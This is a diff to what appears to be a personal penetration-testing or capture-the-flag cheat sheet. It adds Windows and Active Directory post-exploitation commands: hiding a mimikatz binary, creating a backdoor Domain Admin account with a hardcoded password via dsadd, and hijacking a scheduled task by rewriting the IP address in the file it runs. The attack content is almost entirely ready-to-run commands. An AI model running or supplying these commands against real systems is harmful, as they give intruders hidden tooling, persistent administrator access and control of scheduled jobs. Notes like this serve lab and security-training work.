@@ -3,10 +3,27 @@
 Website 
 `Ctrl + Shift + R` - cache refresh pages to ensure last game does not misform as to current context
 
+Hiding binaries
+```powershll
+attrib +h mimikatz.exe
+```
 
+Add a Domain Admin
 ```powershell
+# Check the password requirements before!
+dsadd user "CN=John,CN=Users,DC=object,DC=local" -samid John -pwd johnspassword123! -display "John" -pwdneverexpires yes -memberof "DC=Domain Admins,CN=Users,DC=object,DC=local"
+```
 
-
+Assimilate a schduledtask
+```powershell
+# Find task and its excution path to hijack
+get-scheduledtask | findstr /v Disabled
+$task = get-scheduledtask -taskname <name>
+$task | fl
+$task.Actions.Execute | fl
+$content = Get-Content -Path 'C:\file'
+$newContent = $content -replace '<adversary-ip>', '<your-ip>'
+$newContent | Set-Content -Path 'C:\file'
 ```
 
 
